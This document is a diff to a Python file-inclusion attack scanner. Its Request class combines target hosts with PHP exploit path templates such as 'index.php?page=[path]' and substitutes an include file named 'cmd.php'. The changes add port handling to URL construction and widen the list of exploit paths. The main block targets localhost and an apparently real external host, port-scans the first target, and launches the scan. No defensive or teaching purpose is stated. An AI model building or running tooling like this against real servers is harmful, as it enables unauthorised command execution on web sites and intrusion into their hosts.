@@ -15,7 +15,7 @@ class Request():
        [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
        [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]
 
-    def __init__(self, timer, target, proxy, path, exploit, include):
+    def __init__(self, timer, target, port, proxy, path, exploit, include):
         
         self.id = 0
         self.timer = timer
@@ -23,6 +23,7 @@ class Request():
             self.target = [target]
         else:"""
         self.target = target
+        self.port = str(port)
         self.proxy = proxy
         self.directory = path
         """if isinstance(exploit,  list) is False:
@@ -33,6 +34,8 @@ class Request():
         self.flag= None
         self.stack=[]
 
+    def SetPort(self, port):
+        self.port = port
 
     def starttiming(self):
         return time.time()
@@ -50,13 +53,13 @@ class Request():
         self.flag="glob"
 
 
-    def ConstructUrl(self, target, exploit, directory, include):
+    def ConstructUrl(self, target, port, exploit, directory, include):
        
         self.directory = directory
         self.include   = include
         if exploit.find('[path]') > 0:
             exploit=exploit.replace('[path]',self.include)
-            return 'http://'+target+self.directory+exploit
+            return 'http://'+target+':'+str(port)+self.directory+exploit
         else: return None
 
 
@@ -105,14 +108,14 @@ class Request():
          """ E(0..target) --> E(0..exploit) """ 
          for target in self.target:
              for exploit in self.exploit:
-                 url=self.ConstructUrl(target.strip(), exploit.strip(), self.directory, self.include)                 
+                 url=self.ConstructUrl(target.strip(), self.port, exploit.strip(), self.directory, self.include)                 
                  if url:
                      self.stack.append(url)
                  
 
 import scan
 if __name__=='__main__':
-    target=["www2.nativelabs.org","www3.nativelabs.org"]
+    target=["localhost","www3.nativelabs.org"]
     
     port = 80
     s=scan.ScanOne(target[0], port)
@@ -120,7 +123,7 @@ if __name__=='__main__':
     if result=="open":
         status="open"
     
-    exploit=["admin/index.php?site.php=[path]","file.php?page=[path]"]
+    exploit=["index.php?site.php=[path]","index.php?page=[path]","file.php?page=[path]"]
     phpinc="cmd.php"
     r1=Request(0, target, "", "/", exploit, phpinc)
     r1.scan()
